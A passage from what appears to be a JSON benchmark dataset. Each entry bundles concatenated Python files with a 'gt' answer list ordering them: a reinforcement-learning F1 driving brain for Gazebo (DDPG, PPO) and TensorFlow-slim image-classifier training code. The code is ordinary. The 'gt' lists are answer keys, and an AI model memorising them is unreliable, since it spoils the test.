config[\"algorithm\"][\"ddpg\"][\"model_name\"]\n\n        self.environment[\"ROS_MASTER_URI\"] = config[\"ros\"][\"ros_master_uri\"]\n        self.environment[\"GAZEBO_MASTER_URI\"] = config[\"ros\"][\"gazebo_master_uri\"]\n\n\n\ngpus = tf.config.experimental.list_physical_devices(\"GPU\")\nfor gpu in gpus:\n    tf.config.experimental.set_memory_growth(gpu, True)\n\n\nfrom pydantic import BaseModel\nclass InferenceExecutorValidator(BaseModel):\n    settings: dict\n    agent: dict\n    environment: dict\n    algorithm: dict\n    inference: dict\n\n\n\nclass Brain:\n    def __init__(self, sensors, actuators, handler, config=None):\n        self.camera = sensors.get_camera('camera_0')\n        self.motors = actuators.get_motor('motors_0')\n        self.handler = handler\n        self.config = config\n        self.suddenness_distance = [0]\n        self.st = 0\n        self.en = 0\n\n        args = {\n            'algorithm': 'ddpg',\n            'environment': 'simple',\n            'agent': 'f1',\n            'filename': 'brains/gazebo/f1/config/config_inference_followline_ddpg_f1_gazebo.yaml'\n        }\n\n        f = open(args['filename'], \"r\")\n        read_file = f.read()\n\n        config_file = yaml.load(read_file, Loader=yaml.FullLoader)\n\n        inference_params = {\n            \"settings\": self.get_settings(config_file),\n            \"algorithm\": self.get_algorithm(config_file, args['algorithm']),\n            \"inference\": self.get_inference(config_file, args['algorithm']),\n            \"environment\": self.get_environment(config_file, args['environment']),\n            \"agent\": self.get_agent(config_file, args['agent']),\n        }\n\n        params = InferenceExecutorValidator(**inference_params)\n\n        self.env_name = params.environment[\"params\"][\"env_name\"]\n        env_params = params.environment[\"params\"]\n        actions = params.environment[\"actions\"]\n        env_params[\"actions\"] = actions\n        self.environment = LoadEnvVariablesDDPGGazebo(config_file)\n\n        self.env = gym.make(self.env_name, **self.environment.environment)\n\n        self.inference_file = params.inference[\"params\"][\"inference_ddpg_tf_actor_model_name\"]\n        observation, _ = self.env.reset()\n\n        self.step = 1\n        self.state = observation\n\n        self.inferencer = InferencerWrapper(\"ddpg\", self.inference_file, env=config_file)\n\n    def get_algorithm(self, config_file: dict, input_algorithm: str) -> dict:\n        return {\n            \"name\": input_algorithm,\n            \"params\": config_file[\"algorithm\"][input_algorithm],\n        }\n\n\n    def get_environment(self, config_file: dict, input_env: str) -> dict:\n        return {\n            \"name\": input_env,\n            \"params\": config_file[\"environments\"][input_env],\n            \"actions\": config_file[\"actions\"],\n        }\n\n\n    def get_agent(self, config_file: dict, input_agent: str) -> dict:\n        return {\n            \"name\": input_agent,\n            \"params\": config_file[\"agent\"][input_agent],\n        }\n\n\n    def get_inference(self, config_file: dict, input_inference: str) -> dict:\n        return {\n            \"name\": input_inference,\n            \"params\": config_file[\"inference\"][input_inference],\n        }\n\n\n    def get_settings(self, config_file: dict) -> dict:\n        return {\n            \"name\": \"settings\",\n            \"params\": config_file[\"settings\"],\n        }\n\n    def update_frame(self, frame_id, data):\n\n\n        self.handler.update_frame(frame_id, data)\n\n\n    def execute(self):\n        action = self.inferencer.inference(self.state)\n\n        observation, reward, done, info = self.env.step(action, self.step)\n\n        self.step += 1\n        self.state = observation\n\n        image = self.camera.getImage().data\n\n        self.update_frame('frame_0', image)\n\n\n'BehaviorMetrics/behavior_metrics/brains/gazebo/f1/rl_utils/algorithms/ppo_f1.py'\n:import torch\nimport torch.nn as nn\nfrom torch.distributions import MultivariateNormal\nfrom torch.distributions import Categorical\nimport numpy as np\n\n\nprint(\"============================================================================================\")\n\ndevice = torch.device('cpu')\nif (torch.cuda.is_available()):\n    device = torch.device('cuda:0')\n    torch.cuda.empty_cache()\n    print(\"Device set to : \" + str(torch.cuda.get_device_name(device)))\nelse:\n    print(\"Device set to : cpu\")\nprint(\"============================================================================================\")\n\n\n\nclass RolloutBuffer:\n    def __init__(self):\n        self.actions = []\n        self.states = []\n        self.logprobs = []\n        self.rewards = []\n        self.is_terminals = []\n\n    def clear(self):\n        del self.actions[:]\n        del self.states[:]\n        del self.logprobs[:]\n        del self.rewards[:]\n        del self.is_terminals[:]\n\n\nclass ActorCritic(nn.Module):\n    def __init__(self, state_dim, action_dim, has_continuous_action_space, action_std_init):\n        super(ActorCritic, self).__init__()\n        action_std_init = 0.0001 if action_std_init is None else action_std_init\n\n        self.has_continuous_action_space = has_continuous_action_space\n\n        if has_continuous_action_space:\n            self.action_dim = action_dim\n            self.action_var = torch.full((action_dim,), action_std_init * action_std_init).to(device)\n\n        if has_continuous_action_space:\n            self.actor = nn.Sequential(\n                nn.Linear(state_dim, 64),\n                nn.Tanh(),\n                nn.Linear(64, 64),\n                nn.Tanh(),\n                nn.Linear(64, action_dim),\n                nn.Tanh(),\n            )\n        else:\n            self.actor = nn.Sequential(\n                nn.Linear(state_dim, 64),\n                nn.Tanh(),\n                nn.Linear(64, 64),\n                nn.Tanh(),\n                nn.Linear(64, action_dim),\n                nn.Softmax(dim=-1)\n            )\n\n        self.critic = nn.Sequential(\n            nn.Linear(state_dim, 64),\n            nn.Tanh(),\n            nn.Linear(64, 64),\n            nn.Tanh(),\n            nn.Linear(64, 1)\n        )\n\n    def set_action_std(self, new_action_std):\n        if self.has_continuous_action_space:\n            self.action_var = torch.full((self.action_dim,), new_action_std * new_action_std).to(device)\n        else:\n            print(\"--------------------------------------------------------------------------------------------\")\n            print(\"WARNING : Calling ActorCritic::set_action_std() on discrete action space policy\")\n            print(\"--------------------------------------------------------------------------------------------\")\n\n    def forward(self):\n        raise NotImplementedError\n\n    def act(self, state):\n        if self.has_continuous_action_space:\n            action_mean = self.actor(state)\n            cov_mat = torch.diag(self.action_var).unsqueeze(dim=0)\n            dist = MultivariateNormal(action_mean.float(), cov_mat.float())\n        else:\n            action_probs = self.actor(state)\n            dist = Categorical(action_probs)\n\n        action = dist.sample()\n        action_logprob = dist.log_prob(action)\n\n        return action.detach(), action_logprob.detach()\n\n    def evaluate(self, state, action):\n\n        if self.has_continuous_action_space:\n            action_mean = self.actor(state)\n\n            action_var = self.action_var.expand_as(action_mean)\n            cov_mat = torch.diag_embed(action_var).to(device)\n            dist = MultivariateNormal(action_mean, cov_mat)\n\n\n            if self.action_dim == 1:\n                action = action.reshape(-1, self.action_dim)\n        else:\n            action_probs = self.actor(state)\n            dist = Categorical(action_probs)\n        action_logprobs = dist.log_prob(action)\n        dist_entropy = dist.entropy()\n        state_values = self.critic(state)\n\n        return action_logprobs, state_values, dist_entropy\n\n\nclass PPOF1:\n    def __init__(self, state_dim, action_dim, lr_actor=0.0003, lr_critic=0.001, gamma=None, K_epochs=80, eps_clip=None,\n                 has_continuous_action_space=True, action_std_init=0.2):\n        self.action_std_decay_rate = 0.05\n        self.min_action_std = 0.1\n        self.action_std_decay_freq = int(2.5e5)\n        self.has_continuous_action_space = has_continuous_action_space\n\n        if has_continuous_action_space:\n            self.action_std = action_std_init\n\n        self.gamma = gamma\n        self.eps_clip = eps_clip\n        self.K_epochs = K_epochs\n\n        self.buffer = RolloutBuffer()\n        self.policy_old = ActorCritic(state_dim, action_dim, has_continuous_action_space, action_std_init).to(device)\n        self.optimizer = torch.optim.Adam([\n            {'params': self.policy_old.actor.parameters(), 'lr': lr_actor},\n            {'params': self.policy_old.critic.parameters(), 'lr': lr_critic}\n        ])\n\n        self.MseLoss = nn.MSELoss()\n\n    def select_action(self, state):\n\n        if self.has_continuous_action_space:\n            with torch.no_grad():\n\n                state = torch.tensor(state).to(device)\n                action, action_logprob = self.policy_old.act(state)\n\n            self.buffer.states.append(state)\n            self.buffer.actions.append(action)\n            self.buffer.logprobs.append(action_logprob)\n\n            return action.detach().cpu().numpy().flatten()\n        else:\n\n            with torch.no_grad():\n                state = torch.FloatTensor(state).to(device)\n                action, action_logprob = self.policy_old.act(state)\n\n            self.buffer.states.append(state)\n            self.buffer.actions.append(action)\n            self.buffer.logprobs.append(action_logprob)\n\n            return action.item()\n\n    def inference(self, state):\n        return self.select_action(state)\n\n    def load(self, checkpoint_path):\n        self.policy_old.load_state_dict(torch.load(checkpoint_path, map_location=lambda storage, loc: storage))\n\n'BehaviorMetrics/behavior_metrics/brains/gazebo/f1/rl_utils/algorithms/__init__.py'\n:from brains.gazebo.f1.rl_utils.algorithms.algorithms_type import AlgorithmsType\nfrom brains.gazebo.f1.rl_utils.algorithms.qlearn_f1 import QLearnF1\nfrom brains.gazebo.f1.rl_utils.algorithms.dqn_f1 import DQNF1\nfrom brains.gazebo.f1.rl_utils.algorithms.ddpg_f1 import DDPGF1\nfrom brains.gazebo.f1.rl_utils.algorithms.ppo_f1 import PPOF1\n\nclass InferencerFactory:\n    def __new__(cls, config):\n\n        algorithm = config.algorithm\n        inference_file_name = config.inference_file\n\n        if algorithm == AlgorithmsType.QLEARN.value:\n\n            brain = QLearnF1()\n            brain.load_table(inference_file_name)\n\n            return brain\n\n        if algorithm == AlgorithmsType.DQN.value:\n            brain = DQNF1(config.env)\n            brain.load_inference_model(inference_file_name)\n\n            return brain\n\n\n        if algorithm == AlgorithmsType.DDPG.value:\n            brain = DDPGF1(config.env)\n            brain.load_inference_model(inference_file_name)\n\n            return brain\n\n        if algorithm == AlgorithmsType.PPO.value:\n            brain = PPOF1(8, 2, 0,\n                                 0, 0, 0, 0, True, 0.00001)\n\n\n            brain.load(inference_file_name)\n\n            return brain\n\n\n\n'BehaviorMetrics/behavior_metrics/brains/gazebo/f1/rl_utils/inference.py'\n:from pydantic import BaseModel\n\nfrom brains.gazebo.f1.rl_utils.algorithms import InferencerFactory\n\n\n\n\n\nclass InferencerWrapper:\n    def __init__(self, algorithm, inference_file, actions_file=\"\", env=None):\n\n        inference_params = {\n            \"algorithm\": algorithm,\n            \"inference_file\": inference_file,\n            \"actions_file\": actions_file,\n            \"env\": env,\n        }\n\n\n        params = self.InferenceValidator(**inference_params)\n\n        self.inferencer = InferencerFactory(params)\n\n    class InferenceValidator(BaseModel):\n        inference_file: str\n        algorithm: str\n        actions_file: str\n        env: object\n\n    def inference(self, state):\n        return self.inferencer.inference(state)",
        "gt": [
            "'BehaviorMetrics/behavior_metrics/brains/gazebo/f1/rl_utils/algorithms/ppo_f1.py'",
            "'BehaviorMetrics/behavior_metrics/brains/gazebo/f1/rl_utils/algorithms/__init__.py'",
            "'BehaviorMetrics/behavior_metrics/brains/gazebo/f1/rl_utils/inference.py'",
            "'BehaviorMetrics/behavior_metrics/brains/gazebo/f1/brain_f1_follow_line_ddpg.py'"
        ]
    },
    {
        "files": [
            "'the-neural-perspective/image-processing/models/slim/train_image_classifier.py'",
            "'the-neural-perspective/image-processing/models/slim/datasets/dataset_factory.py'",
            "'the-neural-perspective/image-processing/models/slim/datasets/mnist.py'"
        ],
        "content": "'the-neural-perspective/image-processing/models/slim/train_image_classifier.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\n\nimport tensorflow as tf\n\nfrom tensorflow.python.ops import control_flow_ops\nfrom datasets import dataset_factory\nfrom deployment import model_deploy\nfrom nets import nets_factory\nfrom preprocessing import preprocessing_factory\n\nslim = tf.contrib.slim\n\ntf.app.flags.DEFINE_string(\n    'master', '', 'The address of the TensorFlow master to use.')\n\ntf.app.flags.DEFINE_string(\n    'train_dir', '/tmp/tfmodel/',\n    'Directory where checkpoints and event logs are written to.')\n\ntf.app.flags.DEFINE_integer('num_clones', 1,\n                            'Number of model clones to deploy.')\n\ntf.app.flags.DEFINE_boolean('clone_on_cpu', False,\n                            'Use CPUs to deploy clones.')\n\ntf.app.flags.DEFINE_integer('worker_replicas', 1, 'Number of worker replicas.')\n\ntf.app.flags.DEFINE_integer(\n    'num_ps_tasks', 0,\n    'The number of parameter servers. If the value is 0, then the parameters '\n    'are handled locally by the worker.')\n\ntf.app.flags.DEFINE_integer(\n    'num_readers', 4,\n    'The number of parallel readers that read data from the dataset.')\n\ntf.app.flags.DEFINE_integer(\n    'num_preprocessing_threads', 4,\n    'The number of threads used to create the batches.')\n\ntf.app.flags.DEFINE_integer(\n    'log_every_n_steps', 10,\n    'The frequency with which logs are print.')\n\ntf.app.flags.DEFINE_integer(\n    'save_summaries_secs', 600,\n    'The frequency with which summaries are saved, in seconds.')\n\ntf.app.flags.DEFINE_integer(\n    'save_interval_secs', 600,\n    'The frequency with which the model is saved, in seconds.')\n\ntf.app.flags.DEFINE_integer(\n    'task', 0, 'Task id of the replica running the training.')\n\n\n\n\n\ntf.app.flags.DEFINE_float(\n    'weight_decay', 0.00004, 'The weight decay on the model weights.')\n\ntf.app.flags.DEFINE_string(\n    'optimizer', 'rmsprop',\n    'The name of the optimizer, one of \"adadelta\", \"adagrad\", \"adam\",'\n    '\"ftrl\", \"momentum\", \"sgd\" or \"rmsprop\".')\n\ntf.app.flags.DEFINE_float(\n    'adadelta_rho', 0.95,\n    'The decay rate for adadelta.')\n\ntf.app.flags.DEFINE_float(\n    'adagrad_initial_accumulator_value', 0.1,\n    'Starting value for the AdaGrad accumulators.')\n\ntf.app.flags.DEFINE_float(\n    'adam_beta1', 0.9,\n    'The exponential decay rate for the 1st moment estimates.')\n\ntf.app.flags.DEFINE_float(\n    'adam_beta2', 0.999,\n    'The exponential decay rate for the 2nd moment estimates.')\n\ntf.app.flags.DEFINE_float('opt_epsilon', 1.0, 'Epsilon term for the optimizer.')\n\ntf.app.flags.DEFINE_float('ftrl_learning_rate_power', -0.5,\n                          'The learning rate power.')\n\ntf.app.flags.DEFINE_float(\n    'ftrl_initial_accumulator_value', 0.1,\n    'Starting value for the FTRL accumulators.')\n\ntf.app.flags.DEFINE_float(\n    'ftrl_l1', 0.0, 'The FTRL l1 regularization strength.')\n\ntf.app.flags.DEFINE_float(\n    'ftrl_l2', 0.0, 'The FTRL l2 regularization strength.')\n\ntf.app.flags.DEFINE_float(\n    'momentum', 0.9,\n    'The momentum for the MomentumOptimizer and RMSPropOptimizer.')\n\ntf.app.flags.DEFINE_float('rmsprop_momentum', 0.9, 'Momentum.')\n\ntf.app.flags.DEFINE_float('rmsprop_decay', 0.9, 'Decay term for RMSProp.')\n\n\n\n\n\ntf.app.flags.DEFINE_string(\n    'learning_rate_decay_type',\n    'exponential',\n    'Specifies how the learning rate is decayed. One of \"fixed\", \"exponential\",'\n    ' or \"polynomial\"')\n\ntf.app.flags.DEFINE_float('learning_rate', 0.01, 'Initial learning rate.')\n\ntf.app.flags.DEFINE_float(\n    'end_learning_rate', 0.0001,\n    'The minimal end learning rate used by a polynomial decay learning rate.')\n\ntf.app.flags.DEFINE_float(\n    'label_smoothing', 0.0, 'The amount of label smoothing.')\n\ntf.app.flags.DEFINE_float(\n    'learning_rate_decay_factor', 0.94, 'Learning rate decay factor.')\n\ntf.app.flags.DEFINE_float(\n    'num_epochs_per_decay', 2.0,\n    'Number of epochs after which learning rate decays.')\n\ntf.app.flags.DEFINE_bool(\n    'sync_replicas', False,\n    'Whether or not to synchronize the replicas during training.')\n\ntf.app.flags.DEFINE_integer(\n    'replicas_to_aggregate', 1,\n    'The Number of gradients to collect before updating params.')\n\ntf.app.flags.DEFINE_float(\n    'moving_average_decay', None,\n    'The decay to use for the moving average.'\n    'If left as None, then moving averages are not used.')\n\n\n\n\n\ntf.app.flags.DEFINE_string(\n    'dataset_name', 'imagenet', 'The name of the dataset to load.')\n\ntf.app.flags.DEFINE_string(\n    'dataset_split_name', 'train', 'The name of the train/test split.')\n\ntf.app.flags.DEFINE_string(\n    'dataset_dir', None, 'The directory where the dataset files are stored.')\n\ntf.app.flags.DEFINE_integer(\n    'labels_offset', 0,\n    'An offset for the labels in the dataset. This flag is primarily used to '\n    'evaluate the VGG and ResNet architectures which do not use a background '\n    'class for the ImageNet dataset.')\n\ntf.app.flags.DEFINE_string(\n    'model_name', 'inception_v3', 'The name of the architecture to train.')\n\ntf.app.flags.DEFINE_string(\n    'preprocessing_name', None, 'The name of the preprocessing to use. If left '\n    'as `None`, then the model_name flag is used.')\n\ntf.app.flags.DEFINE_integer(\n    'batch_size', 32, 'The number of samples in each batch.')\n\ntf.app.flags.DEFINE_integer(\n    'train_image_size', None, 'Train image size')\n\ntf.app.flags.DEFINE_integer('max_number_of_steps', None,\n                            'The maximum number of training steps.')\n\n\n\n\n\ntf.app.flags.DEFINE_string(\n    'checkpoint_path', None,\n    'The path to a checkpoint from which to fine-tune.')\n\ntf.app.flags.DEFINE_string(\n    'checkpoint_exclude_scopes', None,\n    'Comma-separated list of scopes of variables to exclude when restoring '\n    'from a checkpoint.')\n\ntf.app.flags.DEFINE_string(\n    'trainable_scopes', None,\n    'Comma-separated list of scopes to filter the set of variables to train.'\n    'By default, None would train all the variables.')\n\ntf.app.flags.DEFINE_boolean(\n    'ignore_missing_vars', False,\n    'When restoring a checkpoint would ignore missing variables.')\n\nFLAGS = tf.app.flags.FLAGS\n\n\ndef _configure_learning_rate(num_samples_per_epoch, global_step):\n\n  decay_steps = int(num_samples_per_epoch / FLAGS.batch_size *\n                    FLAGS.num_epochs_per_decay)\n  if FLAGS.sync_replicas:\n    decay_steps /= FLAGS.replicas_to_aggregate\n\n  if FLAGS.learning_rate_decay_type == 'exponential':\n    return tf.train.exponential_decay(FLAGS.learning_rate,\n                                      global_step,\n                                      decay_steps,\n                                      FLAGS.learning_rate_decay_factor,\n                                      staircase=True,\n                                      name='exponential_decay_learning_rate')\n  elif FLAGS.learning_rate_decay_type == 'fixed':\n    return tf.constant(FLAGS.learning_rate, name='fixed_learning_rate')\n  elif FLAGS.learning_rate_decay_type == 'polynomial':\n    return tf.train.polynomial_decay(FLAGS.learning_rate,\n                                     global_step,\n                                     decay_steps,\n                                     FLAGS.end_learning_rate,\n                                     power=1.0,\n                                     cycle=False,\n                                     name='polynomial_decay_learning_rate')\n  else:\n    raise ValueError('learning_rate_decay_type [%s] was not recognized',\n                     FLAGS.learning_rate_decay_type)\n\n\ndef _configure_optimizer(learning_rate):\n\n  if FLAGS.optimizer == 'adadelta':\n    optimizer = tf.train.AdadeltaOptimizer(\n        learning_rate,\n        rho=FLAGS.adadelta_rho,\n        epsilon=FLAGS.opt_epsilon)\n  elif FLAGS.optimizer == 'adagrad':\n    optimizer = tf.train.AdagradOptimizer(\n        learning_rate,\n        initial_accumulator_value=FLAGS.adagrad_initial_accumulator_value)\n  elif FLAGS.optimizer == 'adam':\n    optimizer = tf.train.AdamOptimizer(\n        learning_rate,\n        beta1=FLAGS.adam_beta1,\n        beta2=FLAGS.adam_beta2,\n        epsilon=FLAGS.opt_epsilon)\n  elif FLAGS.optimizer == 'ftrl':\n    optimizer = tf.train.FtrlOptimizer(\n        learning_rate,\n        learning_rate_power=FLAGS.ftrl_learning_rate_power,\n        initial_accumulator_value=FLAGS.ftrl_initial_accumulator_value,\n        l1_regularization_strength=FLAGS.ftrl_l1,\n        l2_regularization_strength=FLAGS.ftrl_l2)\n  elif FLAGS.optimizer == 'momentum':\n    optimizer = tf.train.MomentumOptimizer(\n        learning_rate,\n        momentum=FLAGS.momentum,\n        name='Momentum')\n  elif FLAGS.optimizer == 'rmsprop':\n    optimizer = tf.train.RMSPropOptimizer(\n        learning_rate,\n        decay=FLAGS.rmsprop_decay,\n        momentum=FLAGS.rmsprop_momentum,\n        epsilon=FLAGS.opt_epsilon)\n  elif FLAGS.optimizer == 'sgd':\n    optimizer = tf.train.GradientDescentOptimizer(learning_rate)\n  else:\n    raise ValueError('Optimizer [%s] was not recognized', FLAGS.optimizer)\n  return optimizer\n\n\ndef _add_variables_summaries(learning_rate):\n  summaries = []\n  for variable in slim.get_model_variables():\n    summaries.append(tf.histogram_summary(variable.op.name, variable))\n  summaries.append(tf.scalar_summary('training/Learning Rate', learning_rate))\n  return summaries\n\n\ndef _get_init_fn():\n\n  if FLAGS.checkpoint_path is None:\n    return None\n\n\n\n  if tf.train.latest_checkpoint(FLAGS.train_dir):\n    tf.logging.info(\n        'Ignoring --checkpoint_path because a checkpoint already exists in %s'\n        % FLAGS.train_dir)\n    return None\n\n  exclusions = []\n  if FLAGS.checkpoint_exclude_scopes:\n    exclusions = [scope.strip()\n                  for scope in FLAGS.checkpoint_exclude_scopes.split(',')]\n\n\n  variables_to_restore = []\n  for var in slim.get_model_variables():\n    excluded = False\n    for exclusion in exclusions:\n      if var.op.name.startswith(exclusion):\n        excluded = True\n        break\n    if not excluded:\n      variables_to_restore.append(var)\n\n  if tf.gfile.IsDirectory(FLAGS.checkpoint_path):\n    checkpoint_path = tf.train.latest_checkpoint(FLAGS.checkpoint_path)\n  else:\n    checkpoint_path = FLAGS.checkpoint_path\n\n  tf.logging.info('Fine-tuning from %s' % checkpoint_path)\n\n  return slim.assign_from_checkpoint_fn(\n      checkpoint_path,\n      variables_to_restore,\n      ignore_missing_vars=FLAGS.ignore_missing_vars)\n\n\ndef _get_variables_to_train():\n\n  if FLAGS.trainable_scopes is None:\n    return tf.trainable_variables()\n  else:\n    scopes = [scope.strip() for scope in FLAGS.trainable_scopes.split(',')]\n\n  variables_to_train = []\n  for scope in scopes:\n    variables = tf.get_collection(tf.GraphKeys.TRAINABLE_VARIABLES, scope)\n    variables_to_train.extend(variables)\n  return variables_to_train\n\n\ndef main(_):\n  if not FLAGS.dataset_dir:\n    raise ValueError('You must supply the dataset directory with --dataset_dir')\n\n  tf.logging.set_verbosity(tf.logging.INFO)\n  with tf.Graph().as_default():\n\n\n\n    deploy_config = model_deploy.DeploymentConfig(\n        num_clones=FLAGS.num_clones,\n        clone_on_cpu=FLAGS.clone_on_cpu,\n        replica_id=FLAGS.task,\n        num_replicas=FLAGS.worker_replicas,\n        num_ps_tasks=FLAGS.num_ps_tasks)\n\n\n    with tf.device(deploy_config.variables_device()):\n      global_step = slim.create_global_step()\n\n\n\n\n    dataset = dataset_factory.get_dataset(\n        FLAGS.dataset_name, FLAGS.dataset_split_name, FLAGS.dataset_dir)\n\n\n\n\n    network_fn = nets_factory.get_network_fn(\n        FLAGS.model_name,\n        num_classes=(dataset.num_classes - FLAGS.labels_offset),\n        weight_decay=FLAGS.weight_decay,\n        is_training=True)\n\n\n\n\n    preprocessing_name = FLAGS.preprocessing_name or FLAGS.model_name\n    image_preprocessing_fn = preprocessing_factory.get_preprocessing(\n        preprocessing_name,\n        is_training=True)\n\n\n\n\n    with tf.device(deploy_config.inputs_device()):\n      provider = slim.dataset_data_provider.DatasetDataProvider(\n          dataset,\n          num_readers=FLAGS.num_readers,\n          common_queue_capacity=20 * FLAGS.batch_size,\n          common_queue_min=10 * FLAGS.batch_size)\n      [image, label] = provider.get(['image', 'label'])\n      label -= FLAGS.labels_offset\n\n      train_image_size = FLAGS.train_image_size or network_fn.default_image_size\n\n      image = image_preprocessing_fn(image, train_image_size, train_image_size)\n\n      images, labels = tf.train.batch(\n          [image, label],\n          batch_size=FLAGS.batch_size,\n          num_threads=FLAGS.num_preprocessing_threads,\n          capacity=5 * FLAGS.batch_size)\n      labels = slim.one_hot_encoding(\n          labels, dataset.num_classes - FLAGS.labels_offset)\n      batch_queue = slim.prefetch_queue.prefetch_queue(\n          [images, labels], capacity=2 * deploy_config.num_clones)\n\n\n\n\n    def clone_fn(batch_queue):\n\n      images, labels = batch_queue.dequeue()\n      logits, end_points = network_fn(images)\n\n\n\n\n      if 'AuxLogits' in end_points:\n        slim.losses.softmax_cross_entropy(\n            end_points['AuxLogits'], labels,\n            label_smoothing=FLAGS.label_smoothing, weight=0.4, scope='aux_loss')\n      slim.losses.softmax_cross_entropy(\n          logits, labels, label_smoothing=FLAGS.label_smoothing, weight=1.0)\n      return end_points\n\n\n    summaries = set(tf.get_collection(tf.GraphKeys.SUMMARIES))\n\n    clones = model_deploy.create_clones(deploy_config, clone_fn, [batch_queue])\n    first_clone_scope = deploy_config.clone_scope(0)\n\n\n    update_ops = tf.get_collection(tf.GraphKeys.UPDATE_OPS, first_clone_scope)\n\n\n    end_points = clones[0].outputs\n    for end_point in end_points:\n      x = end_points[end_point]\n      summaries.add(tf.histogram_summary('activations/' + end_point, x))\n      summaries.add(tf.scalar_summary('sparsity/' + end_point,\n                                      tf.nn.zero_fraction(x)))\n\n\n    for loss in tf.get_collection(tf.GraphKeys.LOSSES, first_clone_scope):\n      summaries.add(tf.scalar_summary('losses/%s' % loss.op.name, loss))\n\n\n    for variable in slim.get_model_variables():\n      summaries.add(tf.histogram_summary(variable.op.name, variable))\n\n\n\n\n    if FLAGS.moving_average_decay:\n      moving_average_variables = slim.get_model_variables()\n      variable_averages = tf.train.ExponentialMovingAverage(\n          FLAGS.moving_average_decay, global_step)\n    else:\n      moving_average_variables, variable_averages = None, None\n\n\n\n\n    with tf.device(deploy_config.optimizer_device()):\n      learning_rate = _configure_learning_rate(dataset.num_samples, global_step)\n      optimizer = _configure_optimizer(learning_rate)\n      summaries.add(tf.scalar_summary('learning_rate', learning_rate,\n                                      name='learning_rate'))\n\n    if FLAGS.sync_replicas:\n\n\n      optimizer = tf.train.SyncReplicasOptimizer(\n          opt=optimizer,\n          replicas_to_aggregate=FLAGS.replicas_to_aggregate,\n          variable_averages=variable_averages,\n          variables_to_average=moving_average_variables,\n          replica_id=tf.constant(FLAGS.task, tf.int32, shape=()),\n          total_num_replicas=FLAGS.worker_replicas)\n    elif FLAGS.moving_average_decay:\n\n      update_ops.append(variable_averages.apply(moving_average_variables))\n\n\n    variables_to_train = _get_variables_to_train()\n\n\n    total_loss, clones_gradients = model_deploy.optimize_clones(\n        clones,\n        optimizer,\n        var_list=variables_to_train)\n\n    summaries.add(tf.scalar_summary('total_loss', total_loss,\n                                    name='total_loss'))\n\n\n    grad_updates = optimizer.apply_gradients(clones_gradients,\n                                             global_step=global_step)\n    update_ops.append(grad_updates)\n\n    update_op = tf.group(*update_ops)\n    train_tensor = control_flow_ops.with_dependencies([update_op], total_loss,\n                                                      name='train_op')\n\n\n\n    summaries |= set(tf.get_collection(tf.GraphKeys.SUMMARIES,\n                                       first_clone_scope))\n\n\n    summary_op = tf.merge_summary(list(summaries), name='summary_op')\n\n\n\n\n\n    slim.learning.train(\n        train_tensor,\n        logdir=FLAGS.train_dir,\n        master=FLAGS.master,\n        is_chief=(FLAGS.task == 0),\n        init_fn=_get_init_fn(),\n        summary_op=summary_op,\n        number_of_steps=FLAGS.max_number_of_steps,\n        log_every_n_steps=FLAGS.log_every_n_steps,\n        save_summaries_secs=FLAGS.save_summaries_secs,\n        save_interval_secs=FLAGS.save_interval_secs,\n        sync_optimizer=optimizer if FLAGS.sync_replicas else None)\n\n\nif __name__ == '__main__':\n  tf.app.run()\n\n'the-neural-perspective/image-processing/models/slim/datasets/dataset_factory.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\n\nfrom datasets import cifar10\nfrom datasets import flowers\nfrom datasets import imagenet\nfrom datasets import mnist\n\ndatasets_map = {\n    'cifar10': cifar10,\n    'flowers': flowers,\n    'imagenet': imagenet,\n    'mnist': mnist,\n}\n\n\ndef get_dataset(name, split_name, dataset_dir, file_pattern=None, reader=None):\n\n  if name not in datasets_map:\n    raise ValueError('Name of dataset unknown %s' % name)\n  return datasets_map[name].get_split(\n      split_name,\n      dataset_dir,\n      file_pattern,\n      reader)\n\n'the-neural-perspective/image-processing/models/slim/datasets/mnist.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\n\nimport os\nimport tensorflow as tf\n\nfrom datasets import dataset_utils\n\nslim = tf.contrib.slim\n\n_FILE_PATTERN = 'mnist_%s.tfrecord'\n\n_SPLITS_TO_SIZES = {'train': 60000, 'test': 10000}\n\n_NUM_CLASSES = 10\n\n_ITEMS_TO_DESCRIPTIONS = {\n    'image': 'A [28 x 28 x 1] grayscale image.',\n    'label': 'A single integer between 0 and 9',\n}\n\n\ndef get_split(split_name, dataset_dir, file_pattern=None, reader=None):\n\n  if split_name not in _SPLITS_TO_SIZES:\n    raise ValueError('split name %s was not recognized.' % split_name)\n\n  if not file_pattern:\n    file_pattern = _FILE_PATTERN\n  file_pattern = os.path.join(dataset_dir, file_pattern % split_name)\n\n\n  if reader is None:\n    reader = tf.TFRecordReader\n\n  keys_to_features = {\n      'image/encoded': tf.FixedLenFeature((), tf.string, default_value=''),\n      'image/format': tf.FixedLenFeature((), tf.string, default_value='raw'),\n      'image/class/label': tf.FixedLenFeature(\n          [1], tf.int64, default_value=tf.zeros([1], dtype=tf.int64)),\n  }\n\n  items_to_handlers = {\n      'image': slim.tfexample_decoder.Image(shape=[28, 28, 1], channels=1),\n      'label': slim.tfexample_decoder.Tensor('image/class/label', shape=[]),\n  }\n\n  decoder = slim.tfexample_decoder.TFExampleDecoder(\n      keys_to_features, items_to_handlers)\n\n  labels_to_names = None\n  if dataset_utils.has_labels(dataset_dir):\n    labels_to_names = dataset_utils.read_label_file(dataset_dir)\n\n  return slim.dataset.Dataset(\n      data_sources=file_pattern,\n      reader=reader,\n      decoder=decoder,\n      num_samples=_SPLITS_TO_SIZES[split_name],\n      num_classes=_NUM_CLASSES,\n      items_to_descriptions=_ITEMS_TO_DESCRIPTIONS,\n      labels_to_names=labels_to_names)\n",
        "gt": [
            "'the-neural-perspective/image-processing/models/slim/datasets/mnist.py'",
            "'the-neural-perspective/image-processing/models/slim/datasets/dataset_factory.py'",
            "'the-neural-perspective/image-processing/models/slim/train_image_classifier.py'"
        ]
    },
    {
        "files": [
            "'voxelpose-pytorch/lib/dataset/panoptic.py'",
            "'voxelpose-pytorch/lib/dataset/__init__.py'",
            "'voxelpose-pytorch/test/evaluate.py'",
            "'voxelpose-pytorch/lib/utils/transforms.py'"
        ],
